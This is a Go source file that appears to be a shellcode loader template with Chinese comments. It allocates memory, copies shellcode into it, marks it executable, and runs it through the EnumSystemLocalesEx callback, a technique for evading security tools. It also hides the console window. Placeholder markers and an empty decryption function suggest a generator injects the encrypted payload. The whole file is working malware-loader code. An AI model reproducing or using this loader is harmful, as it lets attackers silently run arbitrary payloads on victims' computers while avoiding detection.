package main

import (
	"github.com/gonutz/ide/w32"
	"syscall"
	"unsafe"
	//__import__
)

const (
	MEM_COMMIT      = 0x1000
	MEM_RESERVE     = 0x2000
	PageReadwrite   = 0x04  // 可读写
	PageExecuteRead = 0x20  // 可读,可执行

)

var (
	kernel32             = syscall.MustLoadDLL("kernel32.dll")
	ntdll                = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc         = kernel32.MustFindProc("VirtualAlloc")
	RtlMoveMemory        = ntdll.MustFindProc("RtlMoveMemory")
	EnumSystemLocalesEx = kernel32.MustFindProc("EnumSystemLocalesEx")
	VirtualProtect    = kernel32.MustFindProc("VirtualProtect")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PageReadwrite)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	oldProtect := PageReadwrite
	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))
	EnumSystemLocalesEx.Call(addr, 0, 0, 0)
}
func closeWindows(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}

// 解密函数
func f() {}

func main() {
	// shellcode
	closeWindows(w32.SW_HIDE)
	//__init__
	Callback(byteSlice)
}
